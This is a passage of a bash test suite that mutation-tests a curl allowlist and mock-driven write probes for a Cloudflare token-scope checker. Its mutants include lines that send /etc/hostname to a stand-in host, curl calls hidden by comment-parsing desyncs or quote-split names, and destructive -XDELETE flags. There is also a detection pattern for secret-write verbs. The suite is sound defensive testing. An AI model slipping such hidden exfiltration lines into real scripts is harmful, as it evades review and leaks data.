# shellcheck disable=SC2016  # the literal normalised text is the assertion
if [[ "$(cat "$WORK/d12c-synth.out")" == 'r="$(curl --disable -sS -H '"'"'X: #not-a-comment'"'"' "$u" 2>/dev/null || true)"' ]]; then
  ok "D12c positive control: normaliser strips comments, keeps a quoted #, joins a continuation"
else
  no "D12c normaliser control: got [$(cat "$WORK/d12c-synth.out")]"
fi
if grep -qxF -- "$(printf '2\t3\t')$(cat "$WORK/d12c-synth.out")" "$WORK/d12c-synth.out.all"; then
  ok "D12c positive control: the normaliser maps a joined logical line back to its raw range (2-3)"
else
  no "D12c normaliser lost the raw range: [$(cat "$WORK/d12c-synth.out.all")]"
fi
printf '%s\n' "x='unclosed" >"$WORK/d12c-unbal.sh"
d12c_curl_lines "$WORK/d12c-unbal.sh" "$WORK/d12c-unbal.out"
if grep -qF -- 'PARSE-ERROR' "$WORK/d12c-unbal.out"; then ok "D12c positive control: an unbalanced quote is a parse error, never a silent pass"; else no "D12c normaliser accepted an unbalanced quote"; fi
d12c_curl_lines "$SUT" "$WORK/d12c-sut.txt"
assert_eq "D12c the script names curl on exactly the 9 reviewed logical lines" 9 "$(wc -l <"$WORK/d12c-sut.txt" | tr -d '[:space:]')"
# shellcheck disable=SC2016  # literal source text is the assertion
assert_eq "D12c three of them are executed invocations (\$(curl ...)" 3 "$(grep -cF -- '$(curl ' "$WORK/d12c-sut.txt" || true)"
d12c_inv_out="$(d12c_inventory "$SUT")"
if [[ -z "$d12c_inv_out" ]]; then ok "D12c (I) every curl line in source is a reviewed canonical form"; else no "D12c (I) curl lines differ from D12C_CANON: $d12c_inv_out"; fi
d12c_raw_out="$(d12c_raw "$SUT" 0)"
if [[ -z "$d12c_raw_out" ]]; then ok "D12c (R) every raw curl line is a whole-line comment or part of a canonical logical line"; else no "D12c (R) raw curl lines outside every canonical range: $d12c_raw_out"; fi
d12c_raw_out="$(d12c_raw "$SUT" 1)"
if [[ -z "$d12c_raw_out" ]]; then ok "D12c (S) the same holds with every ' \" \\ deleted (no quote-split curl name)"; else no "D12c (S) quote-stripped curl lines outside every canonical range: $d12c_raw_out"; fi
d12c_fl_canon="$(awk -f "$D12C_FLAGS" "$D12C_CANON")"
if [[ -z "$d12c_fl_canon" ]]; then ok "D12c (F) the canonical forms pass the flag allowlist"; else no "D12c (F) a canonical form breaks the allowlist: $d12c_fl_canon"; fi
# shellcheck disable=SC2016  # literal source text is the assertion
assert_eq "D12c the run path sends INVALID_BODY from exactly one curl site" 1 "$(grep -cF -- '--data-binary "$INVALID_BODY"' "$SUT" || true)"

# Mutants of the SCRIPT, each applied to a temp COPY (never the live tree). The
# layer letters name what each mutant must red: I inventory, R raw cross-check,
# S stripped cross-check. A layer is asserted only where it can fail on its own
# (S is a superset of R, so a mutant that reds R does not also assert S).
# shellcheck disable=SC2016  # literal source text is the assertion
D12C_WRITE_ANCHOR='--data-binary "$INVALID_BODY"'
D12C_GET_ANCHOR="-sS --max-time 15 -w '\n%{http_code}' \\"
# d12c_mut <layers> <label> <anchor> <replacement> | <layers> <label> APPEND <line>
d12c_mut() {
  local layers="$1" label="$2" anchor="$3" repl="$4" src copy="$WORK/d12c-mut.sh"
  src="$(cat "$SUT")"
  if [[ "$anchor" == APPEND ]]; then src+=$'\n'"$repl"; else
    [[ "$src" == *"$anchor"* ]] || { no "MUT D12c $label: anchor not found in source (mutant is vacuous)"; return; }
    src="${src/"$anchor"/"$repl"}"
  fi
  printf '%s\n' "$src" >"$copy"
  if [[ "$layers" == *I* ]]; then
    if [[ -n "$(d12c_inventory "$copy")" ]]; then ok "MUT D12c $label reds the canonical inventory (I)"; else no "MUT D12c $label survives the canonical inventory (I)"; fi
  fi
  if [[ "$layers" == *R* ]]; then
    if [[ -n "$(d12c_raw "$copy" 0)" ]]; then ok "MUT D12c $label reds the raw cross-check (R)"; else no "MUT D12c $label survives the raw cross-check (R)"; fi
  fi
  if [[ "$layers" == *S* ]]; then
    if [[ -n "$(d12c_raw "$copy" 1)" ]]; then ok "MUT D12c $label reds the stripped cross-check (S)"; else no "MUT D12c $label survives the stripped cross-check (S)"; fi
  fi
}
# shellcheck disable=SC2016  # literal source text is the mutation
{
d12c_mut IR '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
d12c_mut IR '-d"$X" beside the invalid body' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -d\"\$X\""
d12c_mut IR 'a second body flag (--data-raw "$INVALID_BODY_V2")' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR --data-raw \"\$INVALID_BODY_V2\""
d12c_mut IR '-X "DELETE" in place of the table method' '-X "$method"' '-X "DELETE"'
d12c_mut IR '-XDELETE on a read probe (no body)' "$D12C_GET_ANCHOR" "-sS -XDELETE --max-time 15 -w '\n%{http_code}' \\"
d12c_mut IR 'a new curl line hiding behind "# INVALID_BODY"' APPEND 'curl -sS -d @/etc/hostname https://example.invalid # INVALID_BODY'
# Parser-desync probes: bash RUNS each curl, the normaliser reads it as a comment,
# so (I) cannot see it and the raw cross-check must.
d12c_mut R 'desync: curl after "${x:- #}" (the # is inside the expansion)' APPEND 'echo ${x:- #}; curl -sS -d @/etc/hostname https://example.invalid'
d12c_mut R 'desync: curl after an escaped space "a\ #" (the # is mid-word)' APPEND 'y=a\ #; curl -sS -d @/etc/hostname https://example.invalid'
d12c_mut R 'desync: curl on a "#" line continued from "a\" (the # is mid-word)' APPEND $'echo a\\\n#; curl -sS -d @/etc/hostname https://example.invalid'
# Names split by quotes or a backslash: no raw line says "curl", so only (S) sees them.
d12c_mut S 'split name cu""rl' APPEND 'cu""rl -sS -d @/etc/hostname https://example.invalid'
d12c_mut S 'split name cur\l' APPEND 'cur\l -sS -d @/etc/hostname https://example.invalid'
}
# Mutants of D12C_CANON for the (F) lint: a "reviewed" canon refresh that admits a
# write flag must red (F). Applied to a temp copy of the canon.
# d12c_fmut <label> <anchor> <replacement> | <label> APPEND <line>
d12c_fmut() {
  local label="$1" anchor="$2" repl="$3" src copy="$WORK/d12c-canon-mut.txt"
  src="$(cat "$D12C_CANON")"
  if [[ "$anchor" == APPEND ]]; then src+=$'\n'"$repl"; else
    [[ "$src" == *"$anchor"* ]] || { no "MUT D12c (F) $label: anchor not found in D12C_CANON (mutant is vacuous)"; return; }
    src="${src/"$anchor"/"$repl"}"
  fi
  printf '%s\n' "$src" >"$copy"
  if [[ -n "$(awk -f "$D12C_FLAGS" "$copy")" ]]; then ok "MUT D12c (F) canon admitting $label reds the flag lint"; else no "MUT D12c (F) canon admitting $label survives the flag lint"; fi
}
# shellcheck disable=SC2016  # literal canon text is the mutation
{
d12c_fmut '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
d12c_fmut '-d"$X" beside the invalid body' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -d\"\$X\""
d12c_fmut 'a second body flag (--data-raw "$INVALID_BODY_V2")' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR --data-raw \"\$INVALID_BODY_V2\""
d12c_fmut '-X "DELETE" in place of the table method' '-X "$method"' '-X "DELETE"'
d12c_fmut '-XDELETE on a read probe (no body)' '-sS --max-time 15 -w' '-sS -XDELETE --max-time 15 -w'
d12c_fmut 'a new curl line with -d @/etc/hostname' APPEND 'curl -sS -d @/etc/hostname https://example.invalid'
}
# Non-curl lines that tripped the old spelling list (grep -qF, sort -T, [[ -d) stay green.
printf '%s\n%s\n' "$(cat "$SUT")" '[[ -d /tmp ]] && sort -T /tmp </dev/null >/dev/null; grep -qF -- x /dev/null || true' >"$WORK/d12c-mut.sh"
if [[ -z "$(d12c_inventory "$WORK/d12c-mut.sh")$(d12c_raw "$WORK/d12c-mut.sh" 0)$(d12c_raw "$WORK/d12c-mut.sh" 1)" ]]; then
  ok "D12c negative control: non-curl -d/-T/-F lines do not false-match (I, R, S)"
else
  no "D12c a non-curl line false-matched the allowlist"
fi
# (R) exempts a whole-line comment and the closed env-name set; neither may widen.
printf '%s\n%s\n' "$(cat "$SUT")" '  # a comment that names curl -d @/etc/hostname' >"$WORK/d12c-mut.sh"
if [[ -z "$(d12c_raw "$WORK/d12c-mut.sh" 0)" ]]; then ok "D12c (R) negative control: an appended whole-line comment naming curl stays green"; else no "D12c (R) false-red a whole-line comment"; fi
printf '%s\n%s\n' "$(cat "$SUT")" 'CURL_HOME=/x curl -sS https://example.invalid' >"$WORK/d12c-mut.sh"
if [[ -n "$(d12c_raw "$WORK/d12c-mut.sh" 0)" ]]; then ok "MUT D12c (R) a curl beside an exempt env name (CURL_HOME=/x curl) still reds"; else no "MUT D12c (R) the CURL_HOME exemption hid a curl"; fi
# (U) the mock refuses an unmodelled flag rather than answering it as a GET.
D12C_ULOG="$WORK/d12c-unmodelled.log"; : >"$D12C_ULOG"
PATH="$MOCKPATH" MOCK_CURL_UNMODELLED="$D12C_ULOG" "$MOCKBIN/curl" -sS -XDELETE https://api.cloudflare.com/client/v4/x >"$OUTFILE" 2>&1
d12c_urc=$?
if [[ "$d12c_urc" == 64 ]] && grep -qF -- 'UNMODELLED -XDELETE' "$D12C_ULOG" && [[ ! -s "$OUTFILE" ]]; then
  ok "D12c (U) positive control: the mock refuses -XDELETE (exit 64, logged, no response body)"
else
  no "D12c (U) the mock answered an unmodelled flag (rc=$d12c_urc)"
fi
# End to end: the -XDELETE read-probe mutant, RUN through the mock, lands in the log.
src="$(cat "$SUT")"; printf '%s\n' "${src/"$D12C_GET_ANCHOR"/"-sS -XDELETE --max-time 15 -w '\n%{http_code}' \\"}" >"$WORK/d12c-mut-run.sh"
: >"$D12C_ULOG"
PATH="$MOCKPATH" MOCK_CURL_UNMODELLED="$D12C_ULOG" "$BASHBIN" "$WORK/d12c-mut-run.sh" >"$OUTFILE" 2>&1
d12c_urc=$?
if grep -qF -- 'UNMODELLED -XDELETE' "$D12C_ULOG" && [[ "$d12c_urc" != 0 ]]; then
  ok "MUT D12c the -XDELETE read-probe mutant, run through the mock, is logged UNMODELLED and fails"
else
  no "MUT D12c the -XDELETE mutant ran through the mock unseen (rc=$d12c_urc)"
fi
unset src d12c_urc
src_lacks 'doppler[[:space:]]+(secrets[[:space:]]+)?(set|upload|download|delete|push|create)\b' "D12b no Doppler write verb in source"
# Table-integrity tripwire lives in the SUT (fix-round seats: CI pins D-pc/D3
# cover profile/table drift; the CLASS-column guard has no argv-reachable twin
# and must stay a runtime refusal — pin its presence so it cannot be deleted
# silently).
src_has 'is neither retained nor target' "D12d class-validation tripwire present in source (no argv-reachable twin)"

# ============================================================================
# M-series — migration profiles redirects-dns / zone-rest (#12931, CTO L49):
# invalid-body write probes, deny-control-first, 2xx is fatal with a read-back.
NEW_ACCT="66d4f93f7397f196544e9fe84c3557c2"
NEW_ZONE="951ce525552201ec6c696b24251abed7"
INV_BODY="$(sed -n "s/^readonly INVALID_BODY='\(.*\)'$/\1/p" "$SUT" | head -1)"
MWLOG="$WORK/m-writes.log"
MGLOG="$WORK/m-gets.log"
mrun() { : >"$MWLOG"; : >"$MGLOG"; MOCK_WRITE_LOG="$MWLOG" MOCK_GET_LOG="$MGLOG" run "$MOCKPATH" "$@"; }

# --- M0: the body literal itself (L49): present, not JSON, never the wipe body ---
if [[ -n "$INV_BODY" ]]; then ok "M0 INVALID_BODY literal parsed from source (positive control)"; else no "M0 INVALID_BODY literal not found"; fi
if printf '%s' "$INV_BODY" | "$JQBIN" -e . >/dev/null 2>&1; then no "M0 INVALID_BODY parses as JSON — it could validate"; else ok "M0 INVALID_BODY is not JSON, so no endpoint can validate it"; fi
src_lacks '"rules"[[:space:]]*:[[:space:]]*\[[[:space:]]*\]' 'M0 no {"rules":[]} body anywhere in source (it would wipe a live entrypoint)'
src_has 'INVALID_BODY parses as JSON' "M0 runtime JSON tripwire present in source"

# --- M1: redirects-dns happy path ---
mrun --profile redirects-dns
assert_rc 0 "M1 redirects-dns all authorized -> exit 0"
has "probe=redirects-dns verdict=pass" "M1 prints the pass verdict line"
assert_eq "M1 two write probes (deny + grant) per write row" "$((2 * MW_RD_N))" "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
if awk -v b="$INV_BODY" '{ body=$0; sub(/^[^ ]+ [^ ]+ [^ ]+ /, "", body); if (body != b) bad++ } END { exit bad > 0 }' "$MWLOG"; then
  ok "M1 every write probe carried exactly the INVALID_BODY literal"
else
  no "M1 a write probe carried a different body (see $MWLOG)"
fi
if ! awk '$1 != "PUT" && $1 != "POST" && $1 != "PATCH" {bad++} END {exit bad > 0}' "$MWLOG"; then no "M1 a write probe used a method outside PUT/POST/PATCH"; else ok "M1 write methods are PUT/POST/PATCH only"; fi
if awk -v a="$NEW_ACCT" -v z="$NEW_ZONE" 'index($2, "/zones/" z "/") == 0 && index($2, "/accounts/" a "/") == 0 {bad++} END {exit bad > 0}' "$MWLOG"; then
  ok "M1 every write probe targets the NEW account or zone"
else
  no "M1 a write probe targeted another account/zone"
fi
# Deny-first per URL: the first write to each URL is NOT from the URL's grant token.
if awk '!seen[$2]++ { if (($2 ~ /rulesets\/phases\/|rules\/lists$/ && $3 == "fake-secret-abc123xyz") || ($2 ~ /dns_records$/ && $3 == "default-token-xyz789") || ($2 ~ /pages\/projects$/ && $3 == "tok-pages-mock")) bad++ } END {exit bad > 0}' "$MWLOG"; then
  ok "M1 every URL is probed with the known-denied token before the grant token"
else
  no "M1 a grant token was probed before its deny control (see $MWLOG)"
fi
for ph in http_request_dynamic_redirect http_response_headers_transform http_config_settings http_request_cache_settings http_request_firewall_custom http_request_redirect; do
  has_re "audit: $ph +entrypoint-absent" "M1 whole-list audit reports $ph absent"
done
for leak in fake-secret-abc123xyz default-token-xyz789 tok-pages-mock; do lacks "$leak" "M1 output never carries token $leak"; done

# --- M2: zone-rest happy path ---
mrun --profile zone-rest
assert_rc 0 "M2 zone-rest all authorized -> exit 0"
has "probe=zone-rest verdict=pass" "M2 prints the pass verdict line"
assert_eq "M2 two write probes per zone-rest row" "$((2 * MW_ZR_N))" "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
if grep -qE '^PATCH .*/zones/'"$NEW_ZONE"'/settings ' "$MWLOG" && grep -qE '^PUT .*/zones/'"$NEW_ZONE"'/bot_management ' "$MWLOG"; then
  ok "M2 probes zone settings (PATCH) and bot management (PUT)"
else
  no "M2 zone-rest rows missing (see $MWLOG)"
fi

# --- M3: a grant token answering 403 -> verdict=denied, exit 3 ---
MOV="$WORK/m-override.txt"
printf '%s\n' '/dns_records$|default-token-xyz789|403:{"success":false,"errors":[{"code":10000}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile redirects-dns
assert_rc 3 "M3 DNS write denied -> exit 3"
has "probe=redirects-dns verdict=denied" "M3 prints verdict=denied"
has_re 'zones/<zone>/dns_records +denied \(403, err 10000\)' "M3 names the denied row"
lacks "verdict=pass" "M3 no pass verdict"

# --- M4: the deny control answering 400 -> inconclusive; the grant is NOT probed ---
printf '%s\n' '/http_config_settings/entrypoint$|tok-pages-mock|400:{"success":false,"errors":[{"code":10026}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile redirects-dns
assert_rc 3 "M4 deny control got 400 -> exit 3"
has "probe=redirects-dns verdict=inconclusive" "M4 prints verdict=inconclusive"
has "a 400 cannot prove scope here" "M4 explains why the 400 is not authorization"
assert_eq "M4 the grant token is never probed when the 403 control failed" 0 "$(grep -cE 'http_config_settings/entrypoint fake-secret-abc123xyz ' "$MWLOG" || true)"

# --- M5: a 2xx on the grant probe -> fatal abort (exit 4) + read-back GET ---
printf '%s\n' '/http_request_dynamic_redirect/entrypoint$|fake-secret-abc123xyz|200:{"success":true,"result":{"id":"x"}}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile redirects-dns
assert_rc 4 "M5 a 2xx to the invalid body -> exit 4"
has "probe=redirects-dns verdict=fatal-mutation" "M5 prints verdict=fatal-mutation"
has "a mutation may have landed" "M5 says a mutation may have landed"
if grep -qE "^GET .*/zones/$NEW_ZONE/rulesets/phases/http_request_dynamic_redirect/entrypoint fake-secret-abc123xyz$" "$MGLOG"; then
  ok "M5 the entrypoint was read back with the grant token"
else
  no "M5 no read-back GET of the entrypoint (see $MGLOG)"
fi
has_re 'read-back .*-> 200 \{"success":true,"result":\{"id":"r"' "M5 prints the read-back summary"
assert_eq "M5 the run aborted: no write after the 2xx" 2 "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
lacks "verdict=pass" "M5 no pass verdict"

# --- M5b: a 2xx on the DENY control is fatal too ---
printf '%s\n' '/pages/projects$|fake-secret-abc123xyz|201:{"success":true,"result":{"id":"x"}}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile redirects-dns
assert_rc 4 "M5b a 2xx from the deny-control token -> exit 4"
has "verdict=fatal-mutation" "M5b prints verdict=fatal-mutation"

# --- M5c: the read-back summary never echoes a non-scalar-safe string ---
printf '%s\n' '/bot_management$|tok-botmgmt-mock|200:{"success":true}' >"$MOV"
MOCK_OTHER='200:{"success":true,"result":{"id":"PASS: no scope dropped","version":"1"}}' MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
assert_rc 4 "M5c bot-management 2xx -> exit 4"
lacks "PASS: no scope dropped" "M5c read-back redacts a verdict-looking string"
has '"id":"<redacted>"' "M5c read-back shows the redaction marker"
unset MOCK_OTHER

# --- M6: a degraded control -> inconclusive, and no audit is read from it ---
MOCK_ACCT='200:{"success":false,"result":[]}' mrun --profile redirects-dns
assert_rc 3 "M6 degraded list control -> exit 3"
has "verdict=inconclusive" "M6 prints verdict=inconclusive"
lacks "entrypoint-absent" "M6 a degraded list never yields an entrypoint-absent claim"
MOCK_ZSET='404:{"success":false,"errors":[{"code":7003}]}' mrun --profile zone-rest
assert_rc 3 "M6b zone-rest control 404 -> exit 3"

# --- M7: the audit records a hand-made entrypoint by id ---
MOCK_ACCT='200:{"success":true,"result":[{"id":"0123456789abcdef0123456789abcdef","kind":"zone","phase":"http_config_settings"},{"id":"fedcba9876543210fedcba9876543210","kind":"root","phase":"http_request_redirect"}]}' mrun --profile redirects-dns
assert_rc 0 "M7 entrypoints present still pass (they become imports)"
has_re 'audit: http_config_settings +entrypoint-present id=0123456789abcdef0123456789abcdef' "M7 zone entrypoint recorded by id"
has_re 'audit: http_request_redirect +entrypoint-present id=fedcba9876543210fedcba9876543210' "M7 account root entrypoint recorded by id"
has_re 'audit: http_request_cache_settings +entrypoint-absent' "M7 the others stay absent"

# --- M8: --staged reads the _NEXT keys; a missing one stops before any request ---
MDM="$WORK/m-doppler.log"; : >"$MDM"
MOCK_DOPPLER_MARKER="$MDM" mrun --profile zone-rest --staged
assert_rc 0 "M8 --staged zone-rest -> exit 0"
if grep -qx 'CF_API_TOKEN_ZONE_SETTINGS_NEXT' "$MDM" && grep -qx 'CF_API_TOKEN_BOT_MANAGEMENT_NEXT' "$MDM" \
   && ! grep -qxE 'CF_API_TOKEN_(ZONE_SETTINGS|BOT_MANAGEMENT)' "$MDM" && ! grep -qE '^CF_(ZONE|ACCOUNT)_ID$' "$MDM"; then
  ok "M8 --staged reads only the _NEXT keys and never the Doppler zone/account ids"
else
  no "M8 --staged key binding wrong (see $MDM)"
fi
if grep -q 'tok-zonesettings-mock-next' "$MWLOG"; then ok "M8 the staged token value was presented"; else no "M8 staged token not used"; fi
MCM="$WORK/m-curl-marker"; rm -f "$MCM"
MOCK_NEXT_MISSING=CF_API_TOKEN_PAGES_NEXT MOCK_CURL_MARKER="$MCM" mrun --profile redirects-dns --staged
assert_rc 2 "M8b missing _NEXT key -> exit 2"
has "CF_API_TOKEN_PAGES_NEXT is empty or absent" "M8b names the missing staging key"
if [[ ! -e "$MCM" ]]; then ok "M8b no request was sent before every token was acquired"; else no "M8b curl ran before token acquisition finished"; fi

# --- M9: usage refusals (all before any secret read) ---
MDM9="$WORK/m9-doppler.log"; : >"$MDM9"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --profile redirects-dns --zone-id 5af02a2f394e9ba6e0ea23c381a26b67
assert_rc 2 "M9 the OLD zone id is refused"
has "refusing the OLD account/zone id" "M9 names the refusal"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --profile zone-rest --account-id 4d5ba6f096b2686fbdd404167dd4e125
assert_rc 2 "M9b the OLD account id is refused"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --profile redirects-dns --zone-id 'abc?x'
assert_rc 2 "M9c a non-hex id is refused"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --staged
assert_rc 2 "M9d --staged on the rulesets profile is refused"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --profile redirects-dns --target-entrypoint http_config_settings
assert_rc 2 "M9e --target-entrypoint on a migration profile is refused"
if [[ ! -s "$MDM9" ]]; then ok "M9 every refusal happened before any Doppler read"; else no "M9 a refusal read Doppler first"; fi
run "$MOCKPATH" --profile zone-rest --zone-id 0000000000000000000000000000000a --dry-run
assert_rc 0 "M9f a valid override id is accepted"
has "zones/0000000000000000000000000000000a/settings" "M9f the override id reaches the probe URL"

# --- M10: dry-run prints the recipes, sends nothing, keeps tokens unexpanded ---
MCM10="$WORK/m10-curl-marker"; rm -f "$MCM10"
MOCK_CURL_MARKER="$MCM10" run "$MOCKPATH" --profile redirects-dns --dry-run
assert_rc 0 "M10 redirects-dns dry-run -> exit 0"
if [[ ! -e "$MCM10" ]]; then ok "M10 dry-run never invoked curl"; else no "M10 dry-run invoked curl"; fi
has "INVALID_BODY='$INV_BODY'" "M10 dry-run prints the fixed body literal"
# shellcheck disable=SC2016  # the literal, unexpanded variable names are the assertion
has '"$CF_API_TOKEN_PAGES"' "M10 dry-run keeps token variables unexpanded"
lacks "fake-secret-abc123xyz" "M10 dry-run leaks no token value"
has "zones/$NEW_ZONE/rulesets/phases/http_request_dynamic_redirect/entrypoint" "M10 dry-run targets the NEW zone by default"

# --- D-doc: SKILL.md / playbook documentation pins (AC7) ---
d_has() { if grep -qF -- "$1" "$2"; then ok "$3"; else no "$3 (missing: $1 in $2)"; fi }
d_has '--profile default-token' "$SKILLDOC" "D-doc SKILL.md documents the profile flag"
d_has '--expect-lb-scopes' "$SKILLDOC" "D-doc SKILL.md documents the assert flag"
d_has 'not-yet-widened' "$SKILLDOC" "D-doc SKILL.md documents the neutral state"
d_has 'profiles only' "$SKILLDOC" "D-doc SKILL.md re-words the posture (profiles only, no raw token-var knob)"
# The documented NOTE literal must EQUAL the minted one (fix-round seats: the
# "stable grep target" claim was otherwise unpinned; D2o pins the mint, this
# pins the doc).
d_has 'NOTE: LB scope not-yet-widened — expected BEFORE the #11181 widen; re-run with --expect-lb-scopes after it' "$SKILLDOC" "D-doc SKILL.md quotes the NOTE literal verbatim"
d_has '--profile default-token --expect-lb-scopes' "$PLAYBOOK" "D-doc playbook carries the post-widen pointer"
d_has 'accounts/<acct>/alerting/v3/policies' "$SKILLDOC" "D-doc SKILL.md documents the official Notifications route"
if grep -qF -- 'accounts/<acct>/notification_policies' "$SKILLDOC"; then no "D-doc SKILL.md retains the legacy Notifications route"; else ok "D-doc SKILL.md has no legacy Notifications route"; fi

# --- U1: no SUT run in this suite sent a curl flag the mock does not model (D12c U). ---
if [[ -f "$MOCK_CURL_UNMODELLED" && ! -s "$MOCK_CURL_UNMODELLED" ]]; then
  ok "U1 no run in this suite sent a curl flag the mock does not model"
else
  no "U1 unmodelled curl flags reached the mock: $(cat "$MOCK_CURL_UNMODELLED" 2>/dev/null)"
fi

printf '\n%d passed, %d failed\n' "$pass" "$fail"
MIN_ASSERTIONS=334
if [[ "$((pass + fail))" -lt "$MIN_ASSERTIONS" ]]; then
  printf 'ANTI-VACUITY FLOOR: only %s assertions ran, floor is %s\n' "$((pass + fail))" "$MIN_ASSERTIONS" >&2
  exit 1
fi
[[ "$fail" -eq 0 ]]
